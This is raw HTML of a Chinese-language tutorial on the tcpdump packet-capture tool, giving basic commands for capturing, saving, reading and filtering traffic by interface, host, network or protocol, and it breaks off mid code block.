crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ apt-get install tcpdump</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df55758905094-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df55758905094-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">tcpdump</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>安装好 <code>tcpdump</code> 后，现在来看一些例子。</p>\n<h1 id=\"toc_5\">案例演示</h1>\n<h2 id=\"toc_6\">从所有网卡中捕获数据包</h2>\n<p>运行下面命令来从所有网卡中捕获数据包：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df58243240992\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i any</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df58243240992-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df58243240992-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">any</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2 id=\"toc_7\">从指定网卡中捕获数据包</h2>\n<p>要从指定网卡中捕获数据包，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df5b791150734\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i eth0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df5b791150734-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df5b791150734-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_8\">将捕获的包写入文件</h2>\n<p>使用 <code>-w</code> 选项将所有捕获的包写入文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df5e854183293\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i eth1 -w packets_file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df5e854183293-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df5e854183293-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eth1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">packets_file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h2 id=\"toc_9\">读取之前产生的 tcpdump 文件</h2>\n<p>使用下面命令从之前创建的 tcpdump 文件中读取内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df62550874804\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -r packets_file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df62550874804-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df62550874804-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">packets_file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_10\">获取更多的包信息，并且以可读的形式显示时间戳</h2>\n<p>要获取更多的包信息同时以可读的形式显示时间戳，使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df65664463792\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -ttttnnvvS</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df65664463792-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df65664463792-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ttttnnvvS</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_11\">查看整个网络的数据包</h2>\n<p>要获取整个网络的数据包，在终端执行下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df68357594418\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump net 192.168.1.0/24</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df68357594418-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df68357594418-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">net</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.0</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">24</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h2 id=\"toc_12\">根据 IP 地址查看报文</h2>\n<p>要获取指定 IP 的数据包，不管是作为源地址还是目的地址，使用下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df6b925813944\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump host 192.168.1.100</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df6b925813944-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df6b925813944-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">host</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>要指定 IP 地址是源地址或是目的地址则使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df6e916204877\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump src 192.168.1.100\r\n$ tcpdump dst 192.168.1.100</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df6e916204877-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39926df6e916204877-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39926df6e916204877-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">src</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39926df6e916204877-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcpdump </span><span class=\"crayon-i\">dst</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">192.168.1.100</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h2 id=\"toc_13\">查看某个协议或端口号的数据包</h2>\n<p>要查看某个协议的数据包，运行下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39926df71998977841\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump ssh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39926df71998977841-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; 